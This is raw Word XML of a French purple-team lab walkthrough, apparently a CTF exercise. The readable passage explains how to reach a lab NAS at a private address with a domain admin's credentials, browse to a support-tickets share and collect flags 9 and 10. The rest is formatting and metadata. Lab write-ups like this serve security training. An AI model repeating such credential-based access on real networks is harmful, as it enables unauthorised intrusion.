            <wp:docPr id="863635721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35721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33EC" w14:textId="3D13635A" w:rsidR="002601AB" w:rsidRDefault="002601AB" w:rsidP="002601AB">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc210403960"/>
      <w:r>
        <w:t xml:space="preserve">Etape </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t> : Objectif principal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="4AF772F0" w14:textId="373409FA" w:rsidR="004C2A12" w:rsidRDefault="00CC1DD8" w:rsidP="0022133A">
      <w:r>
        <w:t>Accès au NAS avec les identifiants de l’admin du DC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556C4592" w14:textId="0A209D51" w:rsidR="00F9056C" w:rsidRDefault="00F9056C" w:rsidP="00FD3004">
      <w:r>
        <w:t xml:space="preserve">Trouver le </w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t xml:space="preserve">Flag </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t xml:space="preserve"> : </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5AC061" w14:textId="4885F09B" w:rsidR="00740419" w:rsidRDefault="00740419" w:rsidP="00FD3004">
      <w:r>
        <w:t xml:space="preserve">Les identifiants </w:t>
      </w:r>
      <w:r w:rsidR="00B24075">
        <w:t>pseudo-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">admin ne doivent pas </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>permettre</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>d’</w:t>
      </w:r>
      <w:r>
        <w:t>acc</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>éder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> au </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>flag final mais peuvent donner accès à un autre flag dans le NAS (</w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t>« flag</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>.gif</w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0517D715" w14:textId="77777777" w:rsidR="004C2A12" w:rsidRDefault="004C2A12" w:rsidP="00FD3004"/>
    <w:p w14:paraId="3959DD72" w14:textId="2AA915F5" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Dans l’explorateur saisir « \\192.168.10.100 » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA37B92" w14:textId="77777777" w:rsidR="00F9056C" w:rsidRDefault="00F9056C" w:rsidP="00FE6A9B">
      <w:r w:rsidRPr="00DB2810">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10DD00B0" wp14:editId="09702BC5">
            <wp:extent cx="5760720" cy="401955"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16651734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734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0FD1" w14:textId="77777777" w:rsidR="004C2A12" w:rsidRDefault="004C2A12" w:rsidP="00FE6A9B"/>
    <w:p w14:paraId="75C0E031" w14:textId="7F599B7B" w:rsidR="00FE6A9B" w:rsidRDefault="00F9056C" w:rsidP="00F9056C">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Aller dans « \</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Dsi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Tickets_Support</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> »</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9056C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09DD400D" wp14:editId="7F40D2B1">
            <wp:extent cx="6645910" cy="1179830"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1270"/>
            <wp:docPr id="83429626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626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ACA0" w14:textId="77777777" w:rsidR="004C2A12" w:rsidRDefault="004C2A12" w:rsidP="00F9056C">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C6464E1" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E76BDDC" w14:textId="626F8C84" w:rsidR="00FD3004" w:rsidRDefault="00F9056C" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Trouver le </w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t xml:space="preserve">Flag </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00FD3004">
        <w:t> : Uniquement avec les identifiants Administrateur.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228D10DD" w14:textId="76975D12" w:rsidR="00FE6A9B" w:rsidRPr="0022133A" w:rsidRDefault="008D0D1C" w:rsidP="00C05D4C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="008D0D1C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="349855FD" wp14:editId="3086C6D7">
            <wp:extent cx="3086531" cy="809738"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="1405668735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68735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A9B" w:rsidRPr="0022133A" w:rsidSect="001105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DC9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7A76A32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463ED8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="34EEF8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F7600"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="425C20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26A86"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="674A0D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17003"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D45430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A2F75"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DE7A7A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6A25C8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3A8C5E9A"/>
    <w:lvl w:ilvl="0" w:tplc="44724C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AD4639"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="53EA9D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C4D97"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76CA907C"/>
    <w:lvl w:ilvl="0" w:tplc="F17A5C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81D82"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="29761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D0B4B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C6CE68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BB7D89"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C91AA606"/>
    <w:lvl w:ilvl="0" w:tplc="ACD036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85B59"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="776AAEE4"/>
    <w:lvl w:ilvl="0" w:tplc="F17A5C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616D57"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C4823A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516BD7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AB08C8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8F6C6E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AFB07D3E"/>
    <w:lvl w:ilvl="0" w:tplc="44724C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824906"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F5BA7DC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42673E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E7762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91849">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="998073366">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="810178010">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="703406475">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="452017359">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="909845942">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1944410267">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="2081053813">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="876046361">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="501311290">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="379521312">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="2097630818">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1378970379">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1075594874">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="592202658">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="163324703">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="1367558722">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="9556006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45A"/>
    <w:rsid w:val="00005B94"/>
    <w:rsid w:val="00067270"/>
    <w:rsid w:val="00096FFF"/>
    <w:rsid w:val="000A479F"/>
    <w:rsid w:val="001105B6"/>
    <w:rsid w:val="0011545A"/>
    <w:rsid w:val="001162EE"/>
    <w:rsid w:val="00145896"/>
    <w:rsid w:val="00160E53"/>
    <w:rsid w:val="00165D68"/>
    <w:rsid w:val="001B0676"/>
    <w:rsid w:val="001F2CDC"/>
    <w:rsid w:val="0022133A"/>
    <w:rsid w:val="002305CD"/>
    <w:rsid w:val="0023356D"/>
    <w:rsid w:val="002601AB"/>
    <w:rsid w:val="00270BE2"/>
    <w:rsid w:val="00280958"/>
    <w:rsid w:val="002A3638"/>
    <w:rsid w:val="002B4DF1"/>
    <w:rsid w:val="00333877"/>
    <w:rsid w:val="003E52B2"/>
    <w:rsid w:val="004021CD"/>
    <w:rsid w:val="00416453"/>
    <w:rsid w:val="0044149D"/>
    <w:rsid w:val="00492585"/>
    <w:rsid w:val="00497E36"/>
    <w:rsid w:val="004A04A1"/>
    <w:rsid w:val="004C2A12"/>
    <w:rsid w:val="004D075B"/>
    <w:rsid w:val="004E6D26"/>
    <w:rsid w:val="00504867"/>
    <w:rsid w:val="0053704F"/>
    <w:rsid w:val="005A6D4D"/>
    <w:rsid w:val="005C357D"/>
    <w:rsid w:val="005D5DCB"/>
    <w:rsid w:val="005E34CE"/>
    <w:rsid w:val="00653894"/>
    <w:rsid w:val="00667783"/>
    <w:rsid w:val="006802A1"/>
    <w:rsid w:val="006933DD"/>
    <w:rsid w:val="00700A50"/>
    <w:rsid w:val="00740419"/>
    <w:rsid w:val="007460F4"/>
    <w:rsid w:val="00763F4A"/>
    <w:rsid w:val="007709C2"/>
    <w:rsid w:val="00793603"/>
    <w:rsid w:val="007D233D"/>
    <w:rsid w:val="007D6815"/>
    <w:rsid w:val="00802DD6"/>
    <w:rsid w:val="008608B3"/>
    <w:rsid w:val="0089482B"/>
    <w:rsid w:val="008D0D1C"/>
    <w:rsid w:val="008D3AF0"/>
    <w:rsid w:val="008D52B9"/>
    <w:rsid w:val="00906937"/>
    <w:rsid w:val="00906A10"/>
    <w:rsid w:val="00947268"/>
    <w:rsid w:val="009512CB"/>
    <w:rsid w:val="0097283A"/>
    <w:rsid w:val="009A1FC6"/>
    <w:rsid w:val="009C5F9B"/>
    <w:rsid w:val="009C6E34"/>
    <w:rsid w:val="009D6503"/>
    <w:rsid w:val="009E58E8"/>
    <w:rsid w:val="009F42E6"/>
    <w:rsid w:val="00A00C32"/>
    <w:rsid w:val="00A02115"/>
    <w:rsid w:val="00A07106"/>
    <w:rsid w:val="00A16810"/>
    <w:rsid w:val="00A24A94"/>
    <w:rsid w:val="00A74B52"/>
    <w:rsid w:val="00AA2658"/>
    <w:rsid w:val="00AA7BB4"/>
    <w:rsid w:val="00AB0E41"/>
    <w:rsid w:val="00AB2B18"/>
    <w:rsid w:val="00B24075"/>
    <w:rsid w:val="00B5685C"/>
    <w:rsid w:val="00BA7E78"/>
    <w:rsid w:val="00C016C7"/>
    <w:rsid w:val="00C05D4C"/>
    <w:rsid w:val="00C1719F"/>
    <w:rsid w:val="00C2103E"/>
    <w:rsid w:val="00C4199D"/>
    <w:rsid w:val="00C72F71"/>
    <w:rsid w:val="00C81C92"/>
    <w:rsid w:val="00C93149"/>
    <w:rsid w:val="00CA5A79"/>
    <w:rsid w:val="00CB67EE"/>
    <w:rsid w:val="00CC1DD8"/>
    <w:rsid w:val="00CE4058"/>
    <w:rsid w:val="00D81A6B"/>
    <w:rsid w:val="00DA1857"/>
    <w:rsid w:val="00DB2675"/>
    <w:rsid w:val="00DB2B26"/>
    <w:rsid w:val="00DD2F82"/>
    <w:rsid w:val="00DE2304"/>
    <w:rsid w:val="00DE36F6"/>
    <w:rsid w:val="00E15BB1"/>
    <w:rsid w:val="00E3699C"/>
    <w:rsid w:val="00EA014F"/>
    <w:rsid w:val="00EF1427"/>
    <w:rsid w:val="00EF2C01"/>
    <w:rsid w:val="00F369AF"/>
    <w:rsid w:val="00F9056C"/>
    <w:rsid w:val="00FC48A7"/>
    <w:rsid w:val="00FD3004"/>
    <w:rsid w:val="00FE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5C795"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{71AC20FF-1AA4-4C3C-8798-D0203E558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5B6"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="240" w:line="240" w:lineRule="auto"/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016C7"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="360" w:after="0"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="2E74B5" w:themeColor="accent5" w:themeShade="BF"/>
      <w:sz w:val="5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D3AF0"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="600" w:after="480"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="5B9BD5" w:themeColor="accent5"/>
      <w:sz w:val="30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C2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6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6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6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6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6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6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16C7"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="2E74B5" w:themeColor="accent5" w:themeShade="BF"/>
      <w:sz w:val="5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D3AF0"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="5B9BD5" w:themeColor="accent5"/>
      <w:sz w:val="30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C2A12"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="2F5496" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28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CB67E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67E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67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67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67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67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67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6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6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6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6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67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67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67E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6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67E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67EE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933D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933DD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802A1"/>
    <w:pPr>
      <w:spacing w:before="240" w:line="259" w:lineRule="auto"/>
      <w:jc w:val="left"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="2F5496" w:themeColor="accent1" w:themeShade="BF"/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6802A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802A1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6802A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image" Target="media/image4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L\Purple%20Team\Template%20Projet%20PurpleTeam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8BFDB-5489-4E45-877E-1BCBDFE1D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Projet PurpleTeam.dotx</Template>
  <TotalTime>1467</TotalTime>
  <Pages>22</Pages>
  <Words>1411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Ribeiro</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Simon Ribeiro</cp:lastModifiedBy>
  <cp:revision>37</cp:revision>
  <cp:lastPrinted>2026-04-16T09:24:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-09-23T18:18:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-16T09:33:00Z</dcterms:modified>
</cp:coreProperties>
</file>